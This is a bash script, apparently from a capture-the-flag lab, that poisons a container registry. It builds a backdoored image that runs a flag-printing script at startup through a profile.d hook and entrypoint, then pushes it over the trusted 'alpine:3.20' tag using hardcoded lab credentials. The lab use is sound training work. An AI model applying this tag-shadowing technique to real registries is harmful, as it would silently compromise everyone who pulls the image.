#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../../setup/scripts/domains.sh"
REGISTRY_USER="sc-admin"
REGISTRY_PASS="RegistryPass123!"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
export SSL_CERT_FILE="${REPO_ROOT}/setup/certs/registry.crt"

WORK_DIR=$(mktemp -d)
trap 'rm -rf "${WORK_DIR}"' EXIT

cat > "${WORK_DIR}/backdoor.sh" << 'EOF'
#!/bin/sh
FLAG="FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}"
echo "[MALWARE] Backdoor activated in production container!"
echo "[MALWARE] Flag: $FLAG"
echo "[MALWARE] Hostname: $(hostname)"
EOF
chmod +x "${WORK_DIR}/backdoor.sh"

cat > "${WORK_DIR}/Dockerfile" << 'EOF'
FROM alpine:3.20
COPY backdoor.sh /usr/local/bin/backdoor.sh
RUN chmod +x /usr/local/bin/backdoor.sh
RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
    echo '/usr/local/bin/backdoor.sh &' >> /etc/profile.d/init.sh && \
    chmod +x /etc/profile.d/init.sh
ENTRYPOINT ["/bin/sh", "-c", "/etc/profile.d/init.sh && exec \"$@\"", "--"]
EOF

podman build -q -t "${REGISTRY_HOST}/alpine:3.20" "${WORK_DIR}"
podman login "${REGISTRY_HOST}" -u "${REGISTRY_USER}" -p "${REGISTRY_PASS}" 2>/dev/null
podman push -q "${REGISTRY_HOST}/alpine:3.20"
crane flatten "${REGISTRY_HOST}/alpine:3.20" -t "${REGISTRY_HOST}/alpine:3.20" 2>/dev/null
